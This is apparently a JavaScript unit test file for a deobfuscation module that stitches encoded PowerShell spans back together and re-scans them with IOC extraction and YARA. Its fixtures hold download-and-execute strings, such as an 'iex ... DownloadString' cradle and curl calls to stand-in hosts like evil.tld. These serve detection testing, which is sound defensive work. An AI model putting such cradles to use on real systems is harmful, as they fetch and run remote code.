'use strict';
// encoded-reassembler.test.js — unit coverage for the whole-file reassembly
// module that stitches multiple parallel-obfuscation spans back into the
// source for a single composite analyst view.
//
// The module under test (`src/encoded-reassembler.js`) is a pure
// transformer: given a source string + a list of top-level
// `EncodedContentDetector` findings, it walks each finding's innerFindings
// tree, extracts the deepest decoded text, and splices the result into a
// reconstructed `text` with sentinel markers. No workers, no DOM, no
// fetch — so the harness is just `loadModules` on the one file.
//
// What we cover
// -------------
//   1.  build()  — basic 3-span stitch, sentinel shape, coverage math,
//                  techniques list, reconstructedHash determinism, map order.
//   2.  build()  — single-finding input is skipped (MIN_FINDINGS_USED=2).
//   3.  build()  — below-coverage threshold is skipped.
//   4.  build()  — overlap resolution: higher severity wins, ties go to
//                  the longer decoded text; collisions[] records the loss.
//   5.  build()  — _pickDeepestTextNode prefers _deobfuscatedText over
//                  decodedBytes and walks into innerFindings.
//   6.  build()  — mode gating: 'auto' drops a low-sev finding with no IOCs
//                  and no exec intent; 'bruteforce' keeps it.
//   7.  build()  — finder-budget diagnostic stubs and out-of-range offsets
//                  are discarded before the eligibility count is taken.
//   8.  build()  — MAX_FINDINGS cap bounds the work done on a file that
//                  somehow produced thousands of encoded findings.
//   9.  build()  — MAX_OUTPUT_BYTES produces `truncated = true` without
//                  throwing and still emits a partial reconstruction.
//  10.  build()  — no-source and no-findings short-circuit with a typed
//                  `skipReason` and no exceptions.
//  11.  mapReconToSource() — round-trips a reconstructed offset inside a
//                  spliced span back to the source offset of that span;
//                  returns null for out-of-range input.
//  12.  stripSentinels() — removes every sentinel pair and is idempotent.
//  13.  _decodeAsText() — returns UTF-8 strings, falls back to UTF-16LE,
//                  rejects buffers whose control-char density is too high.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

// Module under test is self-contained — it only touches `window.EncodedReassembler`.
const ctx = loadModules(['src/encoded-reassembler.js'], {
  expose: ['EncodedReassembler'],
});
const { EncodedReassembler } = ctx;
const { build, mapReconToSource, stripSentinels, _decodeAsText, _pickDeepestTextNode, SENTINEL_OPEN, SENTINEL_CLOSE, DEFAULTS } = EncodedReassembler;

// ── Test fixtures ─────────────────────────────────────────────────────────

/** Encode a plain ASCII/UTF-8 string as a Uint8Array the way the
 *  detector attaches `decodedBytes` on every finding. */
function bytes(s) {
  return new TextEncoder().encode(s);
}

/** Build a minimal top-level EncodedContentDetector finding. `opts`
 *  fields match the real detector shape: offset, length, encoding,
 *  severity, decodedBytes, _deobfuscatedText, innerFindings, iocs. */
function mkFinding(opts) {
  return Object.assign({
    type: 'encoded-content',
    encoding: 'Base64',
    severity: 'medium',
    offset: 0,
    length: 10,
    decodedBytes: null,
    innerFindings: [],
    iocs: [],
    chain: null,
  }, opts);
}

// A realistic parallel-obfuscation sample: three `ENC-N` placeholders
// in one `iex "$a $b $c"` wrapper, each resolving to a different atom
// of the payload.
const SAMPLE_SRC =
  'powershell -nop -c "$a=ENC-1; $b=ENC-2; $c=ENC-3; iex \\"$a $b $c\\""';

// ── 1. build(): basic 3-span stitch ───────────────────────────────────────

test('build() stitches three spans and reports sentinels, coverage, techniques, hash', () => {
  const f1 = mkFinding({ offset: SAMPLE_SRC.indexOf('ENC-1'), length: 5, encoding: 'Base64', severity: 'high', decodedBytes: bytes('Invoke-WebRequest'), iocs: [{ type: 'url', url: 'http://evil.tld/a' }] });
  const f2 = mkFinding({ offset: SAMPLE_SRC.indexOf('ENC-2'), length: 5, encoding: 'Char Array', severity: 'high', decodedBytes: bytes("'http://evil.tld/stage2.ps1'"), iocs: [{ type: 'url', url: 'http://evil.tld/stage2.ps1' }] });
  const f3 = mkFinding({ offset: SAMPLE_SRC.indexOf('ENC-3'), length: 5, encoding: 'CMD Obfuscation', severity: 'medium', _deobfuscatedText: '-UseBasicParsing', iocs: [] });
  const out = build(SAMPLE_SRC, [f1, f2, f3], { mode: 'auto' });
  assert.ok(out, 'reassembly emitted a result');
  assert.equal(out.skipReason, undefined, 'no skipReason on happy path');
  assert.equal(out.spans.length, 3, 'one span per finding');

  // Every spliced span must be sentinel-wrapped on both sides.
  for (const s of out.spans) {
    assert.equal(out.text.slice(s.replaceStart, s.replaceStart + SENTINEL_OPEN.length), SENTINEL_OPEN);
    assert.equal(out.text.slice(s.replaceEnd - SENTINEL_CLOSE.length, s.replaceEnd), SENTINEL_CLOSE);
    // `textStart`..`textEnd` points at the decoded body WITHOUT sentinels.
    assert.equal(out.text.slice(s.textStart, s.textEnd), s.deobfuscatedText);
  }

  // Coverage = bytes spliced out of source / source length. Three spans
  // of length 5 → 15 replaced bytes.
  assert.equal(out.coverage.bytesReplaced, 15);
  assert.equal(out.coverage.sourceBytes, SAMPLE_SRC.length);
  assert.ok(out.coverage.ratio > 0 && out.coverage.ratio < 1);

  assert.equal(JSON.stringify(out.techniques.slice().sort()), JSON.stringify(['Base64', 'CMD Obfuscation', 'Char Array']));

  // Hash is deterministic across runs on the same input.
  const out2 = build(SAMPLE_SRC, [f1, f2, f3], { mode: 'auto' });
  assert.equal(out.reconstructedHash, out2.reconstructedHash);
  assert.match(out.reconstructedHash, /^[0-9a-f]{16}$/);

  // Severity rollup — max across spans. Two 'high' in the input.
  assert.equal(out.severity, 'high');
  assert.equal(out.truncated, false);
});

// ── 2. build(): single finding is skipped ─────────────────────────────────

test('build() skips when fewer than MIN_FINDINGS_USED eligible findings', () => {
  const one = mkFinding({ offset: 10, length: 5, decodedBytes: bytes('iex payload'), severity: 'high' });
  const out = build('prefix ENC-1 suffix iex ENC-1 suffix', [one], { mode: 'auto' });
  assert.equal(out.skipReason, 'too-few-findings');
  assert.equal(out.text, undefined);
});

// ── 3. build(): below-coverage threshold is skipped ───────────────────────

test('build() skips when coverage ratio is below MIN_COVERAGE', () => {
  // 10000-byte source, two 3-byte spans → coverage ≈ 0.0006, well under 5%.
  const big = 'x'.repeat(10000);
  const f1 = mkFinding({ offset: 100, length: 3, decodedBytes: bytes('hi1'), severity: 'high', iocs: [{ type: 'url', url: 'http://a' }] });
  const f2 = mkFinding({ offset: 200, length: 3, decodedBytes: bytes('hi2'), severity: 'high', iocs: [{ type: 'url', url: 'http://b' }] });
  const out = build(big, [f1, f2], { mode: 'auto' });
  assert.equal(out.skipReason, 'below-coverage');
  assert.ok(out.coverage && out.coverage.ratio < 0.05);
});

// ── 4. build(): overlap resolution by severity/length, collisions recorded ─

test('build() resolves overlapping spans — higher severity wins, collision logged', () => {
  // Source: 0..30 bytes. f_low at [10, 10) sev medium; f_hi at [10, 10) sev high
  // (same offset+length so they strictly overlap). Expect f_hi kept.
  const src = 'a'.repeat(30);
  const fLow = mkFinding({ offset: 10, length: 10, severity: 'medium', encoding: 'Base64', decodedBytes: bytes('lowlowlow!'), iocs: [{ type: 'url', url: 'http://l' }] });
  const fHi  = mkFinding({ offset: 10, length: 10, severity: 'high',   encoding: 'Char Array', decodedBytes: bytes('HIGH-WINS!'), iocs: [{ type: 'url', url: 'http://h' }] });
  // Need at least 2 accepted spans after collision resolution, so add a
  // third non-overlapping span so the output survives MIN_FINDINGS_USED.
  const fThird = mkFinding({ offset: 25, length: 4, severity: 'high', encoding: 'Hex', decodedBytes: bytes('tailtail'), iocs: [{ type: 'url', url: 'http://t' }] });
  const out = build(src, [fLow, fHi, fThird], { mode: 'auto' });
  assert.ok(out && out.spans, 'stitched result emitted');
  // Two spans accepted (one of the overlap pair + the third).
  assert.equal(out.spans.length, 2);
  const winners = out.spans.map(s => s.encoding).sort();
  assert.equal(JSON.stringify(winners), JSON.stringify(['Char Array', 'Hex']), 'high-severity overlap won');
  // The collision list records the dropped encoding.
  assert.equal(out.collisions.length, 1);
  assert.equal(out.collisions[0].droppedEncoding, 'Base64');
  assert.equal(out.collisions[0].keptEncoding, 'Char Array');
});

// ── 5. _pickDeepestTextNode walks innerFindings ───────────────────────────

test('_pickDeepestTextNode prefers the deepest _deobfuscatedText leaf', () => {
  const deep = {
    type: 'encoded-content',
    encoding: 'PowerShell',
    severity: 'high',
    offset: 0,
    length: 4,
    _deobfuscatedText: 'iex (New-Object Net.WebClient).DownloadString("http://evil")',
    decodedBytes: null,
    innerFindings: [],
  };
  const mid = {
    type: 'encoded-content',
    encoding: 'Base64',
    severity: 'medium',
    offset: 0,
    length: 4,
    decodedBytes: bytes('powershell -enc xyz'),
    innerFindings: [deep],
  };
  const outer = mkFinding({ offset: 0, length: 4, decodedBytes: bytes('raw'), innerFindings: [mid] });

  const pick = _pickDeepestTextNode(outer);
  assert.ok(pick, 'picked a node');
  assert.equal(pick.text, deep._deobfuscatedText, 'deepest _deobfuscatedText wins');
  assert.equal(pick.depth, 2, 'walked two levels into innerFindings');
});

// ── 6. Mode gating: auto drops benign; bruteforce keeps everything ────────

test('build() auto-mode drops low-sev no-IOC no-exec-intent findings; bruteforce keeps them', () => {
  // Need a 'benign' span that lacks all three of: IOCs, high/med severity,
  // exec-intent keyword in decoded text. Wrap it with a separate 'keeper'
  // span so we can inspect how many accepted spans remain.
  const src = 'PREFIX1_____REGION_A_____MID_____REGION_B_____SUFFIX'; // 52 chars
  const benign = mkFinding({
    offset: 12, length: 10, severity: 'info',
    encoding: 'Base64', decodedBytes: bytes('hello world'),  // no exec keyword, no IOCs
    iocs: [],
  });
  const keeper = mkFinding({
    offset: 32, length: 10, severity: 'high',
    encoding: 'Base64', decodedBytes: bytes('iex $payload'),
    iocs: [],
  });
  // Third high-sev to ensure MIN_FINDINGS_USED survives when auto drops benign.
  const keeper2 = mkFinding({
    offset: 47, length: 5, severity: 'high',
    encoding: 'Hex', decodedBytes: bytes('curl http://evil/a'),
    iocs: [{ type: 'url', url: 'http://evil/a' }],
  });

  const autoOut = build(src, [benign, keeper, keeper2], { mode: 'auto' });
  assert.ok(autoOut && autoOut.spans, 'auto mode emitted a reconstruction');
  assert.equal(autoOut.spans.length, 2, 'auto mode dropped the benign span');
  assert.ok(!autoOut.spans.find(s => s.severity === 'info'));

  const bruteOut = build(src, [benign, keeper, keeper2], { mode: 'bruteforce' });
  assert.ok(bruteOut && bruteOut.spans, 'bruteforce emitted a reconstruction');
  assert.equal(bruteOut.spans.length, 3, 'bruteforce kept the benign span');
});

// ── 7. finder-budget + out-of-range findings discarded ────────────────────

test('build() ignores finder-budget stubs and out-of-range offsets', () => {
  const src = 'aaaaaaaaaaaaaaaaaaaa'; // 20 chars
  const stub = mkFinding({ offset: 0, length: 1, encoding: 'finder-budget', decodedBytes: bytes('x') });
  const oob  = mkFinding({ offset: 100, length: 5, decodedBytes: bytes('x'), severity: 'high', iocs: [{ type: 'url', url: 'http://a' }] });
  const good1 = mkFinding({ offset: 2, length: 5, decodedBytes: bytes('payload1'), severity: 'high', iocs: [{ type: 'url', url: 'http://a' }] });
  const good2 = mkFinding({ offset: 10, length: 5, decodedBytes: bytes('iex stuff'), severity: 'high' });
  const out = build(src, [stub, oob, good1, good2], { mode: 'auto' });
  assert.ok(out && out.spans, 'stitched result');
  assert.equal(out.spans.length, 2);
});

// ── 8. MAX_FINDINGS cap ──────────────────────────────────────────────────

test('build() respects MAX_FINDINGS cap', () => {
  const src = 'x'.repeat(4096);
  const fs = [];
  for (let i = 0; i < 200; i++) {
    fs.push(mkFinding({
      offset: i * 20,
      length: 10,
      severity: 'high',
      encoding: 'Base64',
      decodedBytes: bytes(`iex payload${i}`),
      iocs: [{ type: 'url', url: `http://a${i}` }],
    }));
  }
  const out = build(src, fs, { mode: 'auto', limits: { MAX_FINDINGS: 5, MIN_FINDINGS_USED: 2, MIN_COVERAGE: 0, MAX_OUTPUT_BYTES: 4 * 1024 * 1024, MAX_DECODE_PREVIEW: 32 * 1024 } });
  assert.ok(out && out.spans, 'stitched result under cap');
  assert.ok(out.spans.length <= 5, `spans.length (${out.spans.length}) ≤ MAX_FINDINGS`);
});

// ── 9. MAX_OUTPUT_BYTES triggers truncated flag ───────────────────────────

test('build() flags truncated when output ceiling is hit', () => {
  const src = 'x'.repeat(200);
  const decoded = 'A'.repeat(500);
  const f1 = mkFinding({ offset: 10, length: 5, decodedBytes: bytes(decoded), severity: 'high', iocs: [{ type: 'url', url: 'http://a' }] });
  const f2 = mkFinding({ offset: 100, length: 5, decodedBytes: bytes(decoded), severity: 'high', iocs: [{ type: 'url', url: 'http://b' }] });
  const out = build(src, [f1, f2], { mode: 'auto', limits: { MIN_FINDINGS_USED: 2, MIN_COVERAGE: 0, MAX_FINDINGS: 64, MAX_OUTPUT_BYTES: 600, MAX_DECODE_PREVIEW: 32 * 1024 } });
  assert.ok(out && out.spans && out.spans.length >= 1);
  assert.equal(out.truncated, true);
  // The ceiling is a post-splice check — a single span that breaches it
  // still writes its full body + sentinels before the loop bails. So the
  // text may exceed MAX_OUTPUT_BYTES by up to one span (decoded text +
  // sentinels + prefix source). Bound it at ceiling + one-decoded-span.
  assert.ok(out.text.length <= 600 + decoded.length + SENTINEL_OPEN.length + SENTINEL_CLOSE.length + src.length,
    `text length ${out.text.length} within one-span slack of 600`);
});

// ── 10. no-source / no-findings short-circuits ────────────────────────────

test('build() short-circuits on empty source or findings', () => {
  assert.equal(build('', [mkFinding({})], { mode: 'auto' }).skipReason, 'no-source');
  assert.equal(build('abc', [], { mode: 'auto' }).skipReason, 'no-findings');
  assert.equal(build(null, null, { mode: 'auto' }).skipReason, 'no-source');
});

// ── 11. mapReconToSource() round-trip ─────────────────────────────────────

test('mapReconToSource() maps offsets inside spliced spans back to the source', () => {
  const src = 'aaaa' + 'BBBB' + 'cccc' + 'DDDD' + 'eeee'; // 20 chars
  const f1 = mkFinding({ offset: 4,  length: 4, severity: 'high', encoding: 'Base64', decodedBytes: bytes('REPL1'), iocs: [{ type: 'url', url: 'http://a' }] });
  const f2 = mkFinding({ offset: 12, length: 4, severity: 'high', encoding: 'Hex',    decodedBytes: bytes('REPL2'), iocs: [{ type: 'url', url: 'http://b' }] });
  const out = build(src, [f1, f2], { mode: 'auto', limits: { MIN_FINDINGS_USED: 2, MIN_COVERAGE: 0, MAX_FINDINGS: 64, MAX_OUTPUT_BYTES: 4 * 1024 * 1024, MAX_DECODE_PREVIEW: 32 * 1024 } });
  assert.ok(out && out.spans && out.spans.length === 2);

  // Offsets inside a spliced region resolve to the SOURCE offset of
  // that finding.
  const s1 = out.spans[0];
  const inSplice1 = s1.textStart + 2;  // a byte in the middle of REPL1
  assert.equal(mapReconToSource(out, inSplice1), f1.offset);

  // Offsets inside a copied source chunk resolve to the corresponding
  // source byte (reconOffset + delta).
  // The first sourceMap entry is the prefix "aaaa" at recon offset 0.
  assert.equal(mapReconToSource(out, 2), 2);

  // Out-of-range input returns null.
  assert.equal(mapReconToSource(out, 10_000_000), null);
});

// ── 12. stripSentinels() idempotent ───────────────────────────────────────

test('stripSentinels() removes every sentinel and is idempotent', () => {
  const withSent = `hello${SENTINEL_OPEN}payload${SENTINEL_CLOSE}world${SENTINEL_OPEN}more${SENTINEL_CLOSE}`;
  const once = stripSentinels(withSent);
  assert.equal(once, 'hellopayloadworldmore');
  assert.equal(stripSentinels(once), once, 'idempotent');
  assert.equal(stripSentinels(''), '');
});

// ── 13. _decodeAsText — UTF-8 / UTF-16LE / reject binary ──────────────────

test('_decodeAsText returns UTF-8 text for clean input', () => {
  assert.equal(_decodeAsText(bytes('Invoke-WebRequest')), 'Invoke-WebRequest');
});

test('_decodeAsText falls back to UTF-16LE for PowerShell payloads', () => {
  // "iex payload" as UTF-16LE (alternate byte, 0x00 high byte).
  const s = 'iex payload';
  const buf = new Uint8Array(s.length * 2);
  for (let i = 0; i < s.length; i++) {
    buf[i * 2] = s.charCodeAt(i) & 0xff;
    buf[i * 2 + 1] = 0;
  }
  assert.equal(_decodeAsText(buf), s);
});

test('_decodeAsText rejects binary / high-control-density buffers', () => {
  const rand = new Uint8Array(128);
  for (let i = 0; i < 128; i++) rand[i] = i < 32 ? i : 200 + (i % 40);
  assert.equal(_decodeAsText(rand), null);
  assert.equal(_decodeAsText(new Uint8Array(0)), null);
  assert.equal(_decodeAsText(null), null);
});

// ── DEFAULTS surface ──────────────────────────────────────────────────────

test('DEFAULTS surface matches the documented contract', () => {
  assert.equal(typeof DEFAULTS.MIN_FINDINGS_USED, 'number');
  assert.equal(typeof DEFAULTS.MIN_COVERAGE, 'number');
  assert.equal(typeof DEFAULTS.MAX_FINDINGS, 'number');
  assert.equal(typeof DEFAULTS.MAX_OUTPUT_BYTES, 'number');
  assert.equal(typeof DEFAULTS.MAX_DECODE_PREVIEW, 'number');
  // Sentinel pair must be exactly 4 copies of U+2063 (INVISIBLE SEPARATOR).
  assert.equal(SENTINEL_OPEN, '\u2063\u2063\u2063\u2063');
  assert.equal(SENTINEL_CLOSE, '\u2063\u2063\u2063\u2063');
});

// ══════════════════════════════════════════════════════════════════════════
// Phase 2 — analyze() re-scan of the reconstructed text
// ══════════════════════════════════════════════════════════════════════════
//
// `analyze()` runs the IOC regex sweep + decoded-payload YARA over the
// sentinel-stripped stitched body. Both sub-dispatches are injected:
//   • `extractInterestingStringsCore` — test passes a stub that returns
//     a fixed findings array.
//   • `workerManager` — test passes a fake with `runDecodedYara` +
//     `workersAvailable`.
// The module under test never imports either, so the tests stay pure.

const { analyze } = EncodedReassembler;

/** Build a minimal fake worker manager for `analyze()`'s YARA dispatch.
 *  Mirrors the `fakeWorkerManager` helper in decoded-yara-filter.test.js.
 */
function fakeWM({ hits = [], available = true, reject = false } = {}) {
  const calls = [];
  return {
    workersAvailable: () => available,
    runDecodedYara: (payloads, source, opts) => {
      calls.push({ payloadCount: payloads.length, source, opts });
      if (reject) return Promise.reject(new Error('worker-bounce'));
      return Promise.resolve({ hits, parseMs: 1, scanMs: 1, payloadCount: payloads.length, ruleCount: 1 });
    },
    _calls: calls,
  };
}

/** Minimal stub for the IOC extract core. Mirrors the shape
 *  `extractInterestingStringsCore` returns (findings[] + side-channel
 *  maps the caller re-attaches).
 */
function stubExtract(rows) {
  return (_text, _opts) => ({ findings: rows.slice(), droppedByType: {}, totalSeenByType: {} });
}

// Canned reconstructed object used by the analyze() tests.
const RECON = {
  text: `${SENTINEL_OPEN}iex payload${SENTINEL_CLOSE} normal text ${SENTINEL_OPEN}http://evil/a${SENTINEL_CLOSE}`,
  spans: [{}, {}],
  reconstructedHash: 'deadbeefcafebabe',
  coverage: { ratio: 0.3, bytesReplaced: 10, sourceBytes: 33, findingsUsed: 2 },
};

test('analyze() returns empty result for empty reconstruction', async () => {
  const out = await analyze(null);
  assert.equal(out.novelIocs.length, 0);
  assert.equal(out.yaraHits.length, 0);
  assert.equal(out.skipped.extract, 'no-reconstruction');
  assert.equal(out.skipped.yara, 'no-reconstruction');
});

test('analyze() returns empty result when reconstructed.text is empty', async () => {
  const out = await analyze({ text: '', spans: [] });
  assert.equal(out.skipped.extract, 'no-reconstruction');
});

test('analyze() diffs IOCs against existingIocs.allValues — already-known values are NOT flagged novel', async () => {
  const rows = [
    { url: 'http://evil/a', type: 'url' },        // will be flagged novel
    { url: 'http://already-known/b', type: 'url' }, // in existing set, suppressed
  ];
  const existingIocs = { allValues: new Set(['http://already-known/b']) };
  const out = await analyze(RECON, {
    extractInterestingStringsCore: stubExtract(rows),
    existingIocs,
    workerManager: fakeWM(),
    yaraSource: 'rule X { condition: false }',
  });
  assert.equal(out.novelIocs.length, 1);
  assert.equal(out.novelIocs[0].url, 'http://evil/a');
  assert.equal(out.novelIocs[0]._fromReassembly, true);
  assert.equal(out.novelIocs[0]._reconstructedHash, 'deadbeefcafebabe');
});

test('analyze() records skipped.extract when no extract fn is injected', async () => {
  const out = await analyze(RECON, {
    workerManager: fakeWM(),
    yaraSource: 'rule Y { condition: false }',
  });
  assert.equal(out.skipped.extract, 'no-extract-fn');
});

test('analyze() surfaces decoded-payload YARA hits (rule name, severity, tags, description)', async () => {
  const hits = [
    { id: 0, results: [
      { ruleName: 'Reassembled_IEX_Chain', tags: 'reassembled,powershell',
        meta: { severity: 'high', description: 'iex joined across reassembly spans' } },
      { ruleName: 'DownloadExec', tags: 'reassembled',
        meta: { severity: 'critical' } },
    ] },
  ];
  const out = await analyze(RECON, {
    extractInterestingStringsCore: stubExtract([]),
    workerManager: fakeWM({ hits }),
    yaraSource: 'rule R { condition: true }',
  });
  assert.equal(out.yaraHits.length, 2);
  assert.equal(out.yaraHits[0].ruleName, 'Reassembled_IEX_Chain');
  assert.equal(out.yaraHits[0].severity, 'high');
  assert.equal(out.yaraHits[0].description, 'iex joined across reassembly spans');
  assert.equal(out.yaraHits[1].severity, 'critical');
});

test('analyze() dedupes YARA hits by ruleName within a single scan', async () => {
  const hits = [
    { id: 0, results: [
      { ruleName: 'DupRule', tags: '', meta: { severity: 'high' } },
      { ruleName: 'DupRule', tags: '', meta: { severity: 'high' } },
      { ruleName: 'UniqueRule', tags: '', meta: { severity: 'medium' } },
    ] },
  ];
  const out = await analyze(RECON, {
    extractInterestingStringsCore: stubExtract([]),
    workerManager: fakeWM({ hits }),
    yaraSource: 'rule R { condition: true }',
  });
  assert.equal(out.yaraHits.length, 2);
});

test('analyze() records skipped.yara on workers-unavailable', async () => {
  const out = await analyze(RECON, {
    extractInterestingStringsCore: stubExtract([]),
    workerManager: fakeWM({ available: false }),
    yaraSource: 'rule R { condition: true }',
  });
  assert.equal(out.skipped.yara, 'workers-unavailable');
  assert.equal(out.yaraHits.length, 0);
});

test('analyze() records skipped.yara on empty yaraSource', async () => {
  const out = await analyze(RECON, {
    extractInterestingStringsCore: stubExtract([]),
    workerManager: fakeWM(),
    yaraSource: '',
  });
  assert.equal(out.skipped.yara, 'no-yara-source');
});

test('analyze() records skipped.yara on no workerManager', async () => {
  const out = await analyze(RECON, {
    extractInterestingStringsCore: stubExtract([]),
    yaraSource: 'rule R { condition: true }',
  });
  assert.equal(out.skipped.yara, 'no-worker-manager');
});

test('analyze() is silent-no-op on runDecodedYara rejection', async () => {
  const out = await analyze(RECON, {
    extractInterestingStringsCore: stubExtract([{ url: 'http://a', type: 'url' }]),
    workerManager: fakeWM({ reject: true }),
    yaraSource: 'rule R { condition: true }',
  });
  // IOC extract still worked; only YARA collapsed into a skip reason.
  assert.equal(out.skipped.yara, 'yara-threw');
  assert.equal(out.novelIocs.length, 1);
});

test('analyze() populates scannedBytes = stripSentinels length', async () => {
  const out = await analyze(RECON, {
    extractInterestingStringsCore: stubExtract([]),
    workerManager: fakeWM(),
    yaraSource: 'rule R { condition: true }',
  });
  const stripped = stripSentinels(RECON.text);
  assert.equal(out.scannedBytes, stripped.length);
});

test('analyze() passes formatTag=decoded-payload to the worker', async () => {
  const wm = fakeWM();
  await analyze(RECON, {
    extractInterestingStringsCore: stubExtract([]),
    workerManager: wm,
    yaraSource: 'rule R { condition: true }',
  });
  assert.equal(wm._calls.length, 1);
  assert.equal(wm._calls[0].opts.formatTag, 'decoded-payload');
  assert.equal(wm._calls[0].payloadCount, 1);
});
